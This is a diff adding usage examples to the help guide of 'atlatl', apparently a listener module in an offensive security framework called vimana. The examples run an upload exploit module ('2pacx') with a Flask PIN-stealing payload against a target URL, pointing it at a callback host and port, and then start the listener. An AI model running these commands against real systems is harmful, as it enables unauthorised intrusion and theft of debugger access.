@@ -43,3 +43,34 @@ guide:
  
      * You can also see some examples with `vimana guide -m atlatl -e`        
 
+  examples: |
+    ø----------------------ø-----------------------------------------------ø
+     ::::::::⠛⣄::::::⠛⣄:⠛⣄└┐  ATLATL GUIDE  ⠛⣄⠛⣄⠛⣄⠛⣄⠛⣄:::::::::::::::::::⠛⣄
+    ø-----------------------ø----------------------------------------------ø
+    
+     → Session mode:
+
+     Start atlatl in session mode, loading all the required
+     parameters from current siddhi being executed in the
+     primary terminal.
+
+     In this example, the module 2pacx, an exploit type using
+     a flask_stealer payload, is the invoker responsible for
+     informing atlatl the settings to be loaded in the current
+     session. For this, it is required to declare for which
+     module we're passing the settings using the parameter
+     --forward, like this:
+
+     $ vimana run \
+        --module 2pacx \
+        --target-url http://pytestapp:5000/upload \
+        --target-dir config \
+        --payload flask_pinstealer \
+        --forward atlatl \
+        --local-port 9999 \
+        --local-host 123.45.67.89
+
+     After that, you can start the listener by 2pacx session:
+
+     $ vimana run -m atlatl --session 2pacx
+
